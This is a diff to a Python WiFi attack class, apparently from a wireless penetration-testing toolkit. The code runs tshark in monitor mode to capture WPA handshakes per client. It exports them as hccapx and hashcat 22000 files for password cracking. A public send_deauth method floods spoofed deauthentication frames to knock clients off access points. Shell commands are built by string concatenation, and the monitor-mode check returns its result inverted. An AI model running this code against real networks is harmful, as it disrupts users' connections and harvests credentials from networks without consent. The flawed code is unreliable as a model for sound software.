@@ -34,8 +34,9 @@ class WiFi:
     # region Set variables
 
     # region Public variables
-    bssids: Dict[str, Dict[str, Union[int, float, str, bytes, List[str]]]] = dict()
-    wpa_handshakes: Dict[str, Dict[str, Union[int, str, bytes]]] = dict()
+    bssids: Dict[str, Dict[str, Union[int, float, str, bytes, List[Union[int, str]]]]] = dict()
+    wpa_handshakes: Dict[str, Dict[str, Dict[str, Union[int, float, str, bytes]]]] = dict()
+    deauth_packets: List[Dict[str, Union[int, float, str]]] = list()
     # endregion
 
     # region Private variables
@@ -86,14 +87,27 @@ class WiFi:
     # region Constructor
     def __init__(self,
                  wireless_interface,
-                 wifi_channel: Union[None, int] = None) -> None:
+                 wifi_channel: Union[None, int] = None,
+                 ap_bssid: Union[None, str] = None,
+                 client_mac_address: Union[None, str] = None) -> None:
         """
         Constructor for WiFi class
         :param wireless_interface: Wireless interface name (example: 'wlan0')
+        :param wifi_channel: WiFi channel number (example: 1)
+        :param ap_bssid: AP BSSID (example: '01:23:45:67:89:0a')
+        :param client_mac_address: Client MAC address (example: '01:23:45:67:89:0b')
         """
         try:
+            # Check network interface is wireless
+            assert self._base.check_network_interface_is_wireless(interface_name=wireless_interface), \
+                'Network interface: ' + self._base.error_text(wireless_interface) + ' is not wireless!'
             self._interface = wireless_interface
-            self._start_monitor_mode()
+
+            # Checking the ability to enable monitoring mode
+            assert self._enable_monitor_mode(), \
+                'Failed to enable monitor mode on wireless interface: ' + self._base.error_text(self._interface)
+
+            # Set WiFi channel
             if wifi_channel is not None:
                 assert self.validate_wifi_channel(wifi_channel=wifi_channel), \
                     'Bad WiFi channel: ' + self._base.error_text(str(wifi_channel))
@@ -104,7 +118,15 @@ class WiFi:
                     self._wifi_channels['2,4 GHz'] = list()
                     self._wifi_channels['5 Ghz'] = [wifi_channel]
                 self._switch_wifi_channel(channel=wifi_channel)
-            self._thread_manager.add_task(self._sniff)
+
+            # Check tshark start
+            assert self._start_tshark(bssid=ap_bssid, client=client_mac_address), \
+                'Failed to start tshark!'
+
+            # Create thread for reading pcap files
+            self._thread_manager.add_task(self._read_pcap_files)
+
+            # Switching between WiFi channels
             if wifi_channel is None:
                 self._thread_manager.add_task(self._scan_ssids)
 
@@ -113,28 +135,41 @@ class WiFi:
             exit(1)
     # endregion
 
-    # region Start monitor mode on interface
-    def _start_monitor_mode(self) -> None:
+    # region Enable monitor mode on interface
+    def _enable_monitor_mode(self,
+                            wireless_interface: Union[None, str] = None) -> bool:
+        # Set wireless interface
+        if wireless_interface is None:
+            wireless_interface = self._interface
+
         # Mac OS
         if self._base.get_platform().startswith('Darwin'):
-            run([self._airport_path + ' ' + self._interface + ' --disassociate'], shell=True)
+            run([self._airport_path + ' ' + wireless_interface + ' --disassociate'], shell=True)
+            return True
 
         # Linux
         elif self._base.get_platform().startswith('Linux'):
-            interface_mode: CompletedProcess = run(['iwconfig ' + self._interface], shell=True, stdout=PIPE)
+            interface_mode: CompletedProcess = run(['iwconfig ' + wireless_interface], shell=True, stdout=PIPE)
             interface_mode: str = interface_mode.stdout.decode('utf-8')
             if 'Mode:Monitor' not in interface_mode:
-                self._base.print_info('Set monitor mode on wireless interface: ', self._interface)
-                run(['ifconfig ' + self._interface + ' down'], shell=True, stdout=PIPE)
-                run(['iwconfig ' + self._interface + ' mode monitor'], shell=True, stdout=PIPE)
-                run(['ifconfig ' + self._interface + ' up'], shell=True, stdout=PIPE)
+                self._base.print_info('Set monitor mode on wireless interface: ', wireless_interface)
+                run(['ifconfig ' + wireless_interface + ' down'], shell=True, stdout=PIPE)
+                run(['iwconfig ' + wireless_interface + ' mode monitor'], shell=True, stdout=PIPE)
+                run(['ifconfig ' + wireless_interface + ' up'], shell=True, stdout=PIPE)
+                interface_mode: CompletedProcess = run(['iwconfig ' + wireless_interface], shell=True, stdout=PIPE)
+                interface_mode: str = interface_mode.stdout.decode('utf-8')
+                if 'Mode:Monitor' not in interface_mode:
+                    return True
+                else:
+                    return False
             else:
-                self._base.print_info('Wireless interface: ', self._interface, ' already in mode monitor')
+                self._base.print_info('Wireless interface: ', wireless_interface, ' already in mode monitor')
+                return True
 
         # Other
         else:
             self._base.print_error('This platform: ', self._base.get_platform(), ' is not supported')
-            exit(1)
+            return False
     # endregion
 
     # region Switch WiFi channel on interface
@@ -206,8 +241,6 @@ class WiFi:
                     packet[Dot11FCS].addr2 == packet[Dot11FCS].addr3 and \
                     packet[RadioTap].dBm_AntSignal > -95:
 
-                beacon = packet[Dot11Beacon]
-
                 # Compare channel from RadioTap header and Beacon tag: Current channel
                 if packet[Dot11EltRates].payload.ID == 3:
                     assert int.from_bytes(packet[Dot11EltRates].payload.info, 'little') == \
@@ -216,52 +249,101 @@ class WiFi:
 
                 # First Beacon frame
                 if packet[Dot11FCS].addr2 not in self.bssids.keys():
-                    self.bssids[packet[Dot11FCS].addr2]: Dict[str, Union[int, float, str, bytes, List[str]]] = dict()
+                    self.bssids[packet[Dot11FCS].addr2]: \
+                        Dict[str, Union[int, float, str, bytes, List[Union[int, str]]]] = dict()
+                    self.bssids[packet[Dot11FCS].addr2]['channel']: int = \
+                        self._wifi_channel_frequencies[packet[RadioTap].ChannelFrequency]
+                    self.bssids[packet[Dot11FCS].addr2]['packets']: int = 0
                     self.bssids[packet[Dot11FCS].addr2]['clients']: List[str] = list()
+                    self.bssids[packet[Dot11FCS].addr2]['signals']: List[int] = list()
+                    self.bssids[packet[Dot11FCS].addr2]['essids']: List[str] = list()
+                    self.bssids[packet[Dot11FCS].addr2]['enc list']: List[str] = list()
+                    self.bssids[packet[Dot11FCS].addr2]['auth list']: List[str] = list()
+                    self.bssids[packet[Dot11FCS].addr2]['cipher list']: List[str] = list()
 
                 # Next Beacon frame
-                else:
-                    assert (datetime.utcnow().timestamp() - self.bssids[packet[Dot11FCS].addr2]['timestamp']) > 5, \
-                        'Less than 5 seconds have passed'
+                elif self.bssids[packet[Dot11FCS].addr2]['packets'] > 10:
 
-                self.bssids[packet[Dot11FCS].addr2]['timestamp']: datetime = datetime.utcnow().timestamp()
-                self.bssids[packet[Dot11FCS].addr2]['channel frequency']: int = packet[RadioTap].ChannelFrequency
-                self.bssids[packet[Dot11FCS].addr2]['channel']: int = \
-                    self._wifi_channel_frequencies[packet[RadioTap].ChannelFrequency]
-                self.bssids[packet[Dot11FCS].addr2]['signal']: int = packet[RadioTap].dBm_AntSignal
-                self.bssids[packet[Dot11FCS].addr2]['beacon interval']: int = packet[Dot11Beacon].beacon_interval
-                self.bssids[packet[Dot11FCS].addr2]['essid']: str = packet[Dot11Elt].info.decode('utf-8')
+                    # Choose the average value of the Signal
+                    self.bssids[packet[Dot11FCS].addr2]['signal']: int = \
+                        max(self.bssids[packet[Dot11FCS].addr2]['signals'],
+                            key=self.bssids[packet[Dot11FCS].addr2]['signals'].count)
 
-                if packet.haslayer(Dot11EltRSN) and packet.haslayer(Dot11EltMicrosoftWPA):
-                    self.bssids[packet[Dot11FCS].addr2]['enc']: str = 'WPA/WPA2'
+                    # Choose the average value of the ESSID
+                    self.bssids[packet[Dot11FCS].addr2]['essid']: str = \
+                        max(self.bssids[packet[Dot11FCS].addr2]['essids'],
+                            key=self.bssids[packet[Dot11FCS].addr2]['essids'].count)
+
+                    # Choose the average value of the Encryption
+                    self.bssids[packet[Dot11FCS].addr2]['enc']: str = \
+                        max(self.bssids[packet[Dot11FCS].addr2]['enc list'],
+                            key=self.bssids[packet[Dot11FCS].addr2]['enc list'].count)
+
+                    # Choose the average value of the Athentication
                     self.bssids[packet[Dot11FCS].addr2]['auth']: str = \
-                        self._akmsuite_types[packet[Dot11EltMicrosoftWPA].akm_suites[0].suite]
+                        max(self.bssids[packet[Dot11FCS].addr2]['auth list'],
+                            key=self.bssids[packet[Dot11FCS].addr2]['auth list'].count)
+
+                    # Choose the average value of the Cipher
                     self.bssids[packet[Dot11FCS].addr2]['cipher']: str = \
-                        self._cipher_types[packet[Dot11EltMicrosoftWPA].group_cipher_suite[0].cipher]
+                        max(self.bssids[packet[Dot11FCS].addr2]['cipher list'],
+                            key=self.bssids[packet[Dot11FCS].addr2]['cipher list'].count)
+
+                    # Delete first value from lists
+                    self.bssids[packet[Dot11FCS].addr2]['signals'].pop(0)
+                    self.bssids[packet[Dot11FCS].addr2]['essids'].pop(0)
+                    self.bssids[packet[Dot11FCS].addr2]['enc list'].pop(0)
+                    self.bssids[packet[Dot11FCS].addr2]['auth list'].pop(0)
+                    self.bssids[packet[Dot11FCS].addr2]['cipher list'].pop(0)
+
+                    # Decrement number of packets
+                    self.bssids[packet[Dot11FCS].addr2]['packets'] -= 1
+
+                    # Wait 1 seconds
+                    assert (datetime.utcnow().timestamp() - self.bssids[packet[Dot11FCS].addr2]['timestamp']) > 1, \
+                        'Less than 1 seconds have passed'
+
+                # Increment number of packets
+                self.bssids[packet[Dot11FCS].addr2]['packets'] += 1
+                # Update timestamp
+                self.bssids[packet[Dot11FCS].addr2]['timestamp']: datetime = datetime.utcnow().timestamp()
+
+                # Append signal and ESSID in lists
+                self.bssids[packet[Dot11FCS].addr2]['signals'].append(packet[RadioTap].dBm_AntSignal)
+                self.bssids[packet[Dot11FCS].addr2]['essids'].append(packet[Dot11Elt].info.decode('utf-8'))
+
+                # region Encryption info in beacon
+                if packet.haslayer(Dot11EltRSN) and packet.haslayer(Dot11EltMicrosoftWPA):
+                    self.bssids[packet[Dot11FCS].addr2]['enc list'].append('WPA/WPA2')
+                    self.bssids[packet[Dot11FCS].addr2]['auth list'].\
+                        append(self._akmsuite_types[packet[Dot11EltMicrosoftWPA].akm_suites[0].suite])
+                    self.bssids[packet[Dot11FCS].addr2]['cipher list'].\
+                        append(self._cipher_types[packet[Dot11EltMicrosoftWPA].group_cipher_suite[0].cipher])
 
                 elif packet.haslayer(Dot11EltRSN):
-                    self.bssids[packet[Dot11FCS].addr2]['enc']: str = 'WPA2'
-                    self.bssids[packet[Dot11FCS].addr2]['auth']: str = \
-                        self._akmsuite_types[packet[Dot11EltRSN].akm_suites[0].suite]
-                    self.bssids[packet[Dot11FCS].addr2]['cipher']: str = \
-                        self._cipher_types[packet[Dot11EltRSN].group_cipher_suite[0].cipher]
+                    self.bssids[packet[Dot11FCS].addr2]['enc list'].append('WPA2')
+                    self.bssids[packet[Dot11FCS].addr2]['auth list'].\
+                        append(self._akmsuite_types[packet[Dot11EltRSN].akm_suites[0].suite])
+                    self.bssids[packet[Dot11FCS].addr2]['cipher list'].\
+                        append(self._cipher_types[packet[Dot11EltRSN].group_cipher_suite[0].cipher])
 
                 elif packet.haslayer(Dot11EltMicrosoftWPA):
-                    self.bssids[packet[Dot11FCS].addr2]['enc']: str = 'WPA'
-                    self.bssids[packet[Dot11FCS].addr2]['auth']: str = \
-                        self._akmsuite_types[packet[Dot11EltMicrosoftWPA].akm_suites[0].suite]
-                    self.bssids[packet[Dot11FCS].addr2]['cipher']: str = \
-                        self._cipher_types[packet[Dot11EltMicrosoftWPA].group_cipher_suite[0].cipher]
+                    self.bssids[packet[Dot11FCS].addr2]['enc list'].append('WPA')
+                    self.bssids[packet[Dot11FCS].addr2]['auth list'].\
+                        append(self._akmsuite_types[packet[Dot11EltMicrosoftWPA].akm_suites[0].suite])
+                    self.bssids[packet[Dot11FCS].addr2]['cipher list'].\
+                        append(self._cipher_types[packet[Dot11EltMicrosoftWPA].group_cipher_suite[0].cipher])
 
                 elif packet.haslayer(Dot11EltVendorSpecific):
-                    self.bssids[packet[Dot11FCS].addr2]['enc']: str = 'WEP'
-                    self.bssids[packet[Dot11FCS].addr2]['auth']: str = '-'
-                    self.bssids[packet[Dot11FCS].addr2]['cipher']: str = 'WEP'
+                    self.bssids[packet[Dot11FCS].addr2]['enc list'].append('WEP')
+                    self.bssids[packet[Dot11FCS].addr2]['auth list'].append('-')
+                    self.bssids[packet[Dot11FCS].addr2]['cipher list'].append('WEP')
 
                 else:
-                    self.bssids[packet[Dot11FCS].addr2]['enc']: str = 'UNKNOWN'
-                    self.bssids[packet[Dot11FCS].addr2]['auth']: str = 'UNKNOWN'
-                    self.bssids[packet[Dot11FCS].addr2]['cipher']: str = 'UNKNOWN'
+                    self.bssids[packet[Dot11FCS].addr2]['enc list'].append('UNKNOWN')
+                    self.bssids[packet[Dot11FCS].addr2]['auth list'].append('UNKNOWN')
+                    self.bssids[packet[Dot11FCS].addr2]['cipher list'].append('UNKNOWN')
+                # endregion
 
             # endregion
 
@@ -271,7 +353,8 @@ class WiFi:
                     if packet[Dot11FCS].addr2 not in self.bssids[packet[Dot11FCS].addr1]['clients']:
                         self.bssids[packet[Dot11FCS].addr1]['clients'].append(packet[Dot11FCS].addr2)
                 except KeyError:
-                    self.bssids[packet[Dot11FCS].addr1]: Dict[str, Union[int, float, str, bytes, List[str]]] = dict()
+                    self.bssids[packet[Dot11FCS].addr1]: \
+                        Dict[str, Union[int, float, str, bytes, List[Union[int, str]]]] = dict()
                     self.bssids[packet[Dot11FCS].addr1]['clients']: List[str] = list([packet[Dot11FCS].addr2])
             # endregion
 
@@ -282,19 +365,27 @@ class WiFi:
 
                 eapol:  Union[None, Dict[str, Union[int, bytes]]] = self._parse_eapol(packet[EAPOL].original)
                 bssid: str = packet[Dot11FCS].addr2
-                assert bssid not in self.wpa_handshakes.keys(), 'First EAPOL message already in the dictionary!'
+                client: str = packet[Dot11FCS].addr1
 
-                self.wpa_handshakes[bssid]: Dict[str, Union[int, str, bytes]] = dict()
-                self.wpa_handshakes[bssid]['essid'] = 'Unknown'
+                if bssid not in self.wpa_handshakes.keys():
+                    self.wpa_handshakes[bssid]: Dict[str, Union[str, Dict[str, Union[int, float, str, bytes]]]] = dict()
+                assert client not in self.wpa_handshakes[bssid].keys(), \
+                    'First EAPOL message already in the dictionary!'
+
+                self.wpa_handshakes[bssid][client]: Dict[str, Union[int, float, str, bytes]] = dict()
+
+                self.wpa_handshakes[bssid][client]['essid'] = 'Unknown'
                 if bssid in self.bssids.keys() and 'essid' in self.bssids[bssid].keys():
-                    self.wpa_handshakes[bssid]['essid'] = self.bssids[bssid]['essid']
-                self.wpa_handshakes[bssid]['key version'] = eapol['version']
-                self.wpa_handshakes[bssid]['sta'] = packet[Dot11FCS].addr1
-                self.wpa_handshakes[bssid]['anonce'] = eapol['wpa key nonce']
-                self.wpa_handshakes[bssid]['pcap file']: str = \
-                    '/tmp/wpa' + str(self.wpa_handshakes[bssid]['key version']) + '_' + \
-                    self.wpa_handshakes[bssid]['essid'] + '_' + strftime('%Y%m%d_%H%M%S') + '.pcap'
-                wrpcap(self.wpa_handshakes[bssid]['pcap file'], packet, append=True)
+                    self.wpa_handshakes[bssid][client]['essid'] = self.bssids[bssid]['essid']
+
+                self.wpa_handshakes[bssid][client]['key version'] = eapol['version']
+                self.wpa_handshakes[bssid][client]['anonce'] = eapol['wpa key nonce']
+                self.wpa_handshakes[bssid][client]['pcap file']: str = \
+                    'wpa' + str(self.wpa_handshakes[bssid][client]['key version']) + \
+                    '_' + bssid.replace(':', '') + \
+                    '_' + client.replace(':', '') + \
+                    '_' + strftime('%Y%m%d_%H%M%S') + '.pcap'
+                wrpcap(self.wpa_handshakes[bssid][client]['pcap file'], packet, append=True)
             # endregion
 
             # region EAPOL Message 2 of 4
@@ -303,14 +394,20 @@ class WiFi:
                     packet.haslayer(EAPOL):
 
                 eapol: Union[None, Dict[str, Union[int, bytes]]] = self._parse_eapol(packet[EAPOL].original)
-                bssid = packet[Dot11FCS].addr1
-                assert bssid in self.wpa_handshakes.keys(), 'Not found first EAPOL message'
-                assert packet[Dot11FCS].addr2 == self.wpa_handshakes[bssid]['sta'], 'Bad second EAPOL message'
-                assert 'eapol' not in self.wpa_handshakes[bssid].keys(), 'Authentication session already captured'
+                bssid: str = packet[Dot11FCS].addr1
+                client: str = packet[Dot11FCS].addr2
 
-                self.wpa_handshakes[bssid]['snonce'] = eapol['wpa key nonce']
-                self.wpa_handshakes[bssid]['key mic'] = eapol['wpa key mic']
-                self.wpa_handshakes[bssid]['eapol'] = \
+                assert bssid in self.wpa_handshakes.keys(), \
+                    'Not found first EAPOL message'
+                assert client in self.wpa_handshakes[bssid].keys(), \
+                    'Not found first EAPOL message'
+                assert 'eapol' not in self.wpa_handshakes[bssid][client].keys(), \
+                    'Authentication session already captured'
+
+                self.wpa_handshakes[bssid][client]['timestamp']: datetime = datetime.utcnow().timestamp()
+                self.wpa_handshakes[bssid][client]['snonce'] = eapol['wpa key nonce']
+                self.wpa_handshakes[bssid][client]['key mic'] = eapol['wpa key mic']
+                self.wpa_handshakes[bssid][client]['eapol'] = \
                     b''.join([packet[EAPOL].original[:81],
                               b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
                               pack('!H', eapol['wpa key length']),
@@ -320,24 +417,26 @@ class WiFi:
                 hccapx: bytes = b'HCPX'  # Signature
                 hccapx += b'\x04\x00\x00\x00'  # Version
                 hccapx += b'\x02'  # Message pair
-                hccapx += pack('B', len(self.wpa_handshakes[bssid]['essid']))  # ESSID length
-                hccapx += self.wpa_handshakes[bssid]['essid'].encode('utf-8')  # ESSID
+                hccapx += pack('B', len(self.wpa_handshakes[bssid][client]['essid']))  # ESSID length
+                hccapx += self.wpa_handshakes[bssid][client]['essid'].encode('utf-8')  # ESSID
                 # Reserved 32 bytes for ESSID
-                hccapx += b''.join(b'\x00' for _ in range(32 - len(self.wpa_handshakes[bssid]['essid'])))
-                hccapx += pack('B', self.wpa_handshakes[bssid]['key version'])  # Key version
-                hccapx += self.wpa_handshakes[bssid]['key mic']  # Key mic
+                hccapx += b''.join(b'\x00' for _ in range(32 - len(self.wpa_handshakes[bssid][client]['essid'])))
+                hccapx += pack('B', self.wpa_handshakes[bssid][client]['key version'])  # Key version
+                hccapx += self.wpa_handshakes[bssid][client]['key mic']  # Key mic
                 hccapx += self._convert_mac(bssid)  # BSSID
-                hccapx += self.wpa_handshakes[bssid]['anonce']  # AP Key nonce
-                hccapx += self._convert_mac(self.wpa_handshakes[bssid]['sta'])  # Client MAC address
-                hccapx += self.wpa_handshakes[bssid]['snonce']  # Client Key nonce
-                hccapx += pack('H', len(self.wpa_handshakes[bssid]['eapol']))  # Eapol length
-                hccapx += self.wpa_handshakes[bssid]['eapol']
+                hccapx += self.wpa_handshakes[bssid][client]['anonce']  # AP Key nonce
+                hccapx += self._convert_mac(client)  # Client MAC address
+                hccapx += self.wpa_handshakes[bssid][client]['snonce']  # Client Key nonce
+                hccapx += pack('H', len(self.wpa_handshakes[bssid][client]['eapol']))  # Eapol length
+                hccapx += self.wpa_handshakes[bssid][client]['eapol']
                 # Reserved 256 bytes for Client EAPOL key data
-                hccapx += b''.join(b'\x00' for _ in range(256 - len(self.wpa_handshakes[bssid]['eapol'])))
-                self.wpa_handshakes[bssid]['hccapx content']: bytes = hccapx
-                self.wpa_handshakes[bssid]['hccapx file']: str =  \
-                    '/tmp/wpa' + str(self.wpa_handshakes[bssid]['key version']) + '_' + \
-                    self.wpa_handshakes[bssid]['essid'] + '_' + strftime('%Y%m%d_%H%M%S') + '.hccapx'
+                hccapx += b''.join(b'\x00' for _ in range(256 - len(self.wpa_handshakes[bssid][client]['eapol'])))
+                self.wpa_handshakes[bssid][client]['hccapx content']: bytes = hccapx
+                self.wpa_handshakes[bssid][client]['hccapx file']: str =  \
+                    'wpa' + str(self.wpa_handshakes[bssid][client]['key version']) + \
+                    '_' + bssid.replace(':', '') + \
+                    '_' + client.replace(':', '') + \
+                    '_' + strftime('%Y%m%d_%H%M%S') + '.hccapx'
                 # endregion
 
                 # region Hashcat 22000 format
@@ -345,40 +444,40 @@ class WiFi:
 
                 # Key version
                 hashcat_22000 += \
-                    '{0:0=2d}'.format(self.wpa_handshakes[bssid]['key version']) + '*'
+                    '{0:0=2d}'.format(self.wpa_handshakes[bssid][client]['key version']) + '*'
 
                 # Key mic
                 hashcat_22000 += \
-                    ''.join('{:02x}'.format(x) for x in self.wpa_handshakes[bssid]['key mic']) + '*'
+                    ''.join('{:02x}'.format(x) for x in self.wpa_handshakes[bssid][client]['key mic']) + '*'
 
                 # BSSID
-                hashcat_22000 += \
-                    ''.join('{:02x}'.format(x) for x in self._convert_mac(bssid)) + '*'
+                hashcat_22000 += bssid.replace(':', '') + '*'
 
                 # Client MAC address
-                hashcat_22000 += \
-                    ''.join('{:02x}'.format(x) for x in self._convert_mac(self.wpa_handshakes[bssid]['sta'])) + '*'
+                hashcat_22000 += client.replace(':', '') + '*'
 
                 # ESSID
                 hashcat_22000 += \
-                    ''.join(str(ord(x)) for x in self.wpa_handshakes[bssid]['essid']) + '*'
+                    ''.join('{:02x}'.format(ord(x)) for x in self.wpa_handshakes[bssid][client]['essid']) + '*'
 
                 # AP Key nonce
                 hashcat_22000 += \
-                    ''.join('{:02x}'.format(x) for x in self.wpa_handshakes[bssid]['anonce']) + '*'
+                    ''.join('{:02x}'.format(x) for x in self.wpa_handshakes[bssid][client]['anonce']) + '*'
 
                 # Client EAPOL key data
                 hashcat_22000 += \
-                    ''.join('{:02x}'.format(x) for x in self.wpa_handshakes[bssid]['eapol']) + '*'
+                    ''.join('{:02x}'.format(x) for x in self.wpa_handshakes[bssid][client]['eapol']) + '*'
 
                 # End of file
                 hashcat_22000 += '00\n'
 
                 # Save to wpa_handshakes dictionary
-                self.wpa_handshakes[bssid]['hashcat 22000 content']: str = hashcat_22000
-                self.wpa_handshakes[bssid]['hashcat 22000 file']: str = \
-                    '/tmp/wpa' + str(self.wpa_handshakes[bssid]['key version']) + '_' + \
-                    self.wpa_handshakes[bssid]['essid'] + '_' + strftime('%Y%m%d_%H%M%S') + '.22000'
+                self.wpa_handshakes[bssid][client]['hashcat 22000 content']: str = hashcat_22000
+                self.wpa_handshakes[bssid][client]['hashcat 22000 file']: str = \
+                    'wpa' + str(self.wpa_handshakes[bssid][client]['key version']) + \
+                    '_' + bssid.replace(':', '') + \
+                    '_' + client.replace(':', '') + \
+                    '_' + strftime('%Y%m%d_%H%M%S') + '.22000'
                 # endregion
 
                 # region Print Key info
@@ -387,8 +486,8 @@ class WiFi:
                 # print_key_mic: str = ' '.join('{:02X}'.format(x) for x in self.wpa_handshakes[bssid]['key mic'])
                 # print_eapol: str = ' '.join('{:02X}'.format(x) for x in self.wpa_handshakes[bssid]['eapol'])
                 #
-                # self._base.print_success('ESSID (length: ' + str(len(self.wpa_handshakes[bssid]['essid'])) + '): ',
-                #                          self.wpa_handshakes[bssid]['essid'])
+                # self._base.print_success('ESSID (length: ' + str(len(self.wpa_handshakes[bssid][client]['essid'])) + '): ',
+                #                          self.wpa_handshakes[bssid][client]['essid'])
                 # self._base.print_success('Key version: ', str(self.wpa_handshakes[bssid]['key version']))
                 # self._base.print_success('BSSID: ', str(bssid))
                 # self._base.print_success('STA: ', str(self.wpa_handshakes[bssid]['sta']))
@@ -402,12 +501,12 @@ class WiFi:
                 #                                            subsequent_indent=self._prefix))
                 # endregion
 
-                # region Save EAPOL session to hccapx file - hccapx is a custom format for hashcat
-                with open(self.wpa_handshakes[bssid]['hccapx file'], 'wb') as hccapx_file:
-                    hccapx_file.write(self.wpa_handshakes[bssid]['hccapx content'])
-                with open(self.wpa_handshakes[bssid]['hashcat 22000 file'], 'w') as hccapx_file:
-                    hccapx_file.write(self.wpa_handshakes[bssid]['hashcat 22000 content'])
-                wrpcap(self.wpa_handshakes[bssid]['pcap file'], packet, append=True)
+                # region Save EAPOL session to hccapx, 22000, pcap files
+                with open(self.wpa_handshakes[bssid][client]['hccapx file'], 'wb') as hccapx_file:
+                    hccapx_file.write(self.wpa_handshakes[bssid][client]['hccapx content'])
+                with open(self.wpa_handshakes[bssid][client]['hashcat 22000 file'], 'w') as hccapx_file:
+                    hccapx_file.write(self.wpa_handshakes[bssid][client]['hashcat 22000 content'])
+                wrpcap(self.wpa_handshakes[bssid][client]['pcap file'], packet, append=True)
                 # endregion
                 
             # endregion
@@ -429,35 +528,49 @@ class WiFi:
 
     # endregion
 
-    # region Sniff wireless interface
-    def _sniff(self,
-               bssid: Union[None, str] = None,
-               client: Union[None, str] = None) -> None:
-        """
-        Sniff a wireless interface
-        :param bssid: BSSID (example: '01:23:45:67:89:0a')
-        :param client: A client MAC address (example: '01:23:45:67:89:0b')
-        :return: None
-        """
+    # region Start tshark program
+    def _start_tshark(self,
+                      wireless_interface: Union[None, str] = None,
+                      pcap_files_directory: Union[None, str] = None,
+                      bssid: Union[None, str] = None,
+                      client: Union[None, str] = None) -> bool:
+        # Set wireless interface
+        if wireless_interface is None:
+            wireless_interface = self._interface
+
+        # Set directory with pcap files
+        if pcap_files_directory is None:
+            pcap_files_directory = self._pcap_directory
+
         # Kill all tshark processes
         self._base.kill_process_by_name(process_name='tshark')
 
-        # Clear directory for pcap files
-        if not isdir(self._pcap_directory):
-            mkdir(self._pcap_directory)
-        else:
-            rmtree(self._pcap_directory)
-            mkdir(self._pcap_directory)
-
         # Run tshark process
-        Popen(['tshark -y "IEEE802_11_RADIO" -I -i ' + self._interface +
-               ' -b duration:1 -w ' + self._pcap_directory +
+        Popen(['tshark -y "IEEE802_11_RADIO" -I -i ' + wireless_interface +
+               ' -b duration:1 -w ' + pcap_files_directory +
                'sniff.pcap -f "(wlan type data) or (wlan type mgt subtype beacon)"'],
               shell=True, stdout=PIPE, stderr=PIPE)
 
+        return True
+    # endregion
+
+    # region Read pcap files from directory
+    def _read_pcap_files(self,
+                         pcap_files_directory: Union[None, str] = None) -> None:
+        # Set directory with pcap files
+        if pcap_files_directory is None:
+            pcap_files_directory = self._pcap_directory
+
+        # Clear directory for pcap files
+        if not isdir(pcap_files_directory):
+            mkdir(pcap_files_directory)
+        else:
+            rmtree(pcap_files_directory)
+            mkdir(pcap_files_directory)
+
         while True:
             # Make list with pcap files
-            pcap_files: List[str] = [path_join(self._pcap_directory, file) for file in listdir(self._pcap_directory)]
+            pcap_files: List[str] = [path_join(pcap_files_directory, file) for file in listdir(pcap_files_directory)]
 
             # If length of pcap file more than one
             if len(pcap_files) > 1:
@@ -477,8 +590,10 @@ class WiFi:
                         assert packet.haslayer(RadioTap), 'Is not RadioTap packet!'
                         assert packet.haslayer(Dot11FCS), 'Is not IEEE 802.11 packet!'
                         self._analyze_packet(packet)
+
                     except IndexError:
                         pass
+
                     except AssertionError:
                         pass
 
@@ -486,20 +601,6 @@ class WiFi:
             else:
                 sleep(1)
 
-            # if bssid is not None and client is not None:
-            #     sniff(iface=self._interface, prn=self._analyze_packet, timeout=timeout, monitor=True,
-            #           lfilter=lambda x: (x.addr1 == bssid and x.addr2 == client) or
-            #                             (x.addr1 == client and x.addr2 == bssid))
-            # if bssid is not None and client is None:
-            #     sniff(iface=self._interface, prn=self._analyze_packet, timeout=timeout, monitor=True,
-            #           lfilter=lambda x: (x.addr1 == bssid and (x.FCfield.value % 2 != 0)) or
-            #                             (x.addr2 == bssid and (x.FCfield.value % 2 == 0)))
-            # if bssid is None and client is not None:
-            #     sniff(iface=self._interface, prn=self._analyze_packet, timeout=timeout, monitor=True,
-            #           lfilter=lambda x: (x.addr2 == client and (x.FCfield.value % 2 != 0)) or
-            #                             (x.addr1 == client and (x.FCfield.value % 2 == 0)))
-            # if bssid is None and client is None:
-            #     sniff(iface=self._interface, prn=self._analyze_packet, monitor=True, timeout=timeout)
     # endregion
 
     # region Scan WiFi channels and search AP ssids
@@ -511,30 +612,6 @@ class WiFi:
                     sleep(2)
             else:
                 sleep(2)
-    # endregion
-
-    # region Sending deauth packets
-    def _send_deauth(self,
-                     bssid: str = '01:23:45:67:89:0a',
-                     client: str = '01:23:45:67:89:0b',
-                     number_of_deauth_packets: int = 5) -> None:
-        """
-        Sending 802.11 deauth packets
-        :param bssid: BSSID (example: '01:23:45:67:89:0a')
-        :param client: A client MAC address for deauth (example: '01:23:45:67:89:0b')
-        :param number_of_deauth_packets: The number of deauth packets for one iteration (default: 5)
-        :return: None
-        """
-        deauth_packet: bytes = RadioTap() / \
-                               Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) / \
-                               Dot11Deauth(reason=7)
-
-        for _ in range(number_of_deauth_packets):
-            sendp(deauth_packet, iface=self._interface, monitor=True, verbose=False)
-
-        self._base.print_info('Send ', str(number_of_deauth_packets),
-                              ' deauth packets to: ', client,
-                              ' from: ', bssid)
     # endregion
 
     # endregion
@@ -553,7 +630,35 @@ class WiFi:
         self._switch_between_channels = False
         self._switch_wifi_channel(channel=channel)
     # endregion
-    
+
+    # region Sending deauth packets
+    def send_deauth(self,
+                    bssid: str = '01:23:45:67:89:0a',
+                    client: str = '01:23:45:67:89:0b',
+                    number_of_deauth_packets: int = 50) -> None:
+        """
+        Sending 802.11 deauth packets
+        :param bssid: BSSID (example: '01:23:45:67:89:0a')
+        :param client: A client MAC address for deauth (example: '01:23:45:67:89:0b')
+        :param number_of_deauth_packets: The number of deauth packets for one iteration (default: 50)
+        :return: None
+        """
+        client_deauth_packet: bytes = RadioTap() / \
+                                      Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) / \
+                                      Dot11Deauth(reason=7)
+        ap_deauth_packet: bytes = RadioTap() / \
+                                  Dot11(type=0, subtype=12, addr1=bssid, addr2=client, addr3=bssid) / \
+                                  Dot11Deauth(reason=7)
+
+        for _ in range(int(number_of_deauth_packets / 2)):
+            sendp(client_deauth_packet, iface=self._interface, monitor=True, verbose=False)
+            sendp(ap_deauth_packet, iface=self._interface, monitor=True, verbose=False)
+
+        self.deauth_packets.append({'packets': number_of_deauth_packets,
+                                    'bssid': bssid, 'client': client,
+                                    'timestamp': datetime.utcnow().timestamp()})
+    # endregion
+
     # endregion
 
 # endregion
